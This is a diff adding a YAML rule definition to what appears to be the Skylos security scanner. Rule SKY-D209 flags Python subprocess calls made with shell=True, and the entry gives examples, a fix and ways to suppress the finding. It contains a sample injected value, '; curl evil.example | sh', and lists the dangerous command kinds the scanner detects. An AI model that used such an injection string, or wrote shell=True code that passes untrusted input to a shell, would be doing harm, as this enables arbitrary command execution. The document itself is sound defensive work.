@@ -1,0 +1,142 @@
+id: SKY-D209
+title: Subprocess run through a shell
+family: security
+severity: HIGH
+severity_note: >-
+  A command written directly as fixed text, with no `$` or backtick
+  expansion and no risky command in it, is reported as LOW and hidden from
+  the default list.
+languages: [Python]
+gate:
+  full: counted
+  note: LOW findings for fixed commands are hidden from the default list but still counted.
+cwe: [CWE-78]
+
+what_it_is: >-
+  `subprocess.run(..., shell=True)` and the helpers that always use a shell
+  pass the whole command string to `/bin/sh`, which also obeys `;`, `|`,
+  `&&` and `$( )`. SKY-D209 reports these calls so that the command string
+  is reviewed.
+
+why_it_matters: >-
+  Whatever ends up in the string runs with the program's rights. A task
+  name, branch name or file name containing `; curl evil.example | sh`
+  becomes a second command, and quoting mistakes are easy to miss in review.
+
+flagged_example:
+  language: python
+  filename: tools/tasks.py
+  expect_line: 9
+  code: |
+    import json
+    import subprocess
+    from pathlib import Path
+
+
+    def run_task(name: str) -> int:
+        tasks = json.loads(Path("tasks.json").read_text())
+        command = tasks[name]
+        return subprocess.run(command, shell=True).returncode
+
+not_flagged_example:
+  language: python
+  filename: tools/tasks.py
+  code: |
+    import json
+    import shlex
+    import subprocess
+    from pathlib import Path
+
+
+    def run_task(name: str) -> int:
+        tasks = json.loads(Path("tasks.json").read_text())
+        argv = shlex.split(tasks[name])
+        return subprocess.run(argv).returncode
+  why: >-
+    `shlex.split()` turns the command into a list of words and
+    `subprocess.run()` starts the program directly, with no shell, so `;`
+    or `$( )` in the text are passed as plain characters. Without
+    `shell=True` there is nothing for this rule to report.
+
+how_skylos_decides:
+  - >-
+    Resolves call names through imports and assignments (`import subprocess
+    as sp`, `run = subprocess.run`).
+  - >-
+    Matches any `subprocess.*` call that passes `shell=True` as a literal,
+    plus `subprocess.getoutput`, `subprocess.getstatusoutput` and
+    `asyncio.create_subprocess_shell`, which always use a shell. A `shell=`
+    given as a variable is not matched here.
+  - >-
+    Reports HIGH when the command is built (f-string, `+`, `%`), is a
+    variable or parameter, contains `$` or a backtick, or is a fixed command
+    that the shell-command guard rates as dangerous (broad deletes, secret
+    exfiltration, a download piped into a shell, credential reads).
+  - >-
+    Lowers to LOW a command written directly as fixed text without any of
+    that, such as `"git rev-parse HEAD"`. LOW findings are hidden from the
+    default list, stay in JSON output and are counted by the gate.
+  - >-
+    Untrusted data (a parameter, request data, the environment) reaching
+    the command is reported separately as SKY-D212, which also covers a
+    `shell=` given as a variable.
+
+source_refs:
+  - path: skylos/rules/danger/calls.py
+    symbol: "DANGEROUS_CALLS = {"
+    note: "`subprocess.*` with `shell=True` and the shell-only helpers."
+  - path: skylos/rules/danger/calls.py
+    symbol: "def _kw_equals("
+    note: "`shell=True` must be a literal."
+  - path: skylos/rules/danger/calls.py
+    symbol: "def _call_severity("
+  - path: skylos/rules/danger/calls.py
+    symbol: "def _call_low_risk_context("
+  - path: skylos/reporting/listing.py
+    symbol: "LOW_RISK_REASONS = {"
+
+fix:
+  explanation: >-
+    Split the command into a list and drop `shell=True`. If the string
+    really needs shell features such as pipes, build it from fixed parts
+    and pass each variable through `shlex.quote()`.
+  filename: tools/tasks.py
+  code: |
+    import json
+    import shlex
+    import subprocess
+    from pathlib import Path
+
+
+    def run_task(name: str) -> int:
+        tasks = json.loads(Path("tasks.json").read_text())
+        argv = shlex.split(tasks[name])
+        return subprocess.run(argv).returncode
+
+false_alarms_and_suppression:
+  misfires:
+    - >-
+      Commands from a file your team controls, such as a `Makefile`-like
+      task list, are still reported as HIGH: the rule does not know who
+      writes the file.
+    - >-
+      When the command also contains a function parameter or request value,
+      the same line gets SKY-D212 as well.
+  suppress:
+    - check: inline
+      text: >-
+        Mark a reviewed call on its own line. A bare `# noqa` does not hide
+        a HIGH security finding.
+      language: python
+      code: |
+        subprocess.run(command, shell=True)  # skylos: ignore[SKY-D209] tasks.json is repo-owned
+    - check: baseline
+      text: >-
+        Accept existing findings with `skylos baseline .`, then scan with
+        `--baseline`.
+    - check: config
+      text: >-
+        `[tool.skylos] ignore = ["SKY-D209"]` turns the rule off for the
+        whole project. It does not hide SKY-D212.
+
+related: [SKY-D212, SKY-D203, SKY-D328, SKY-D200]
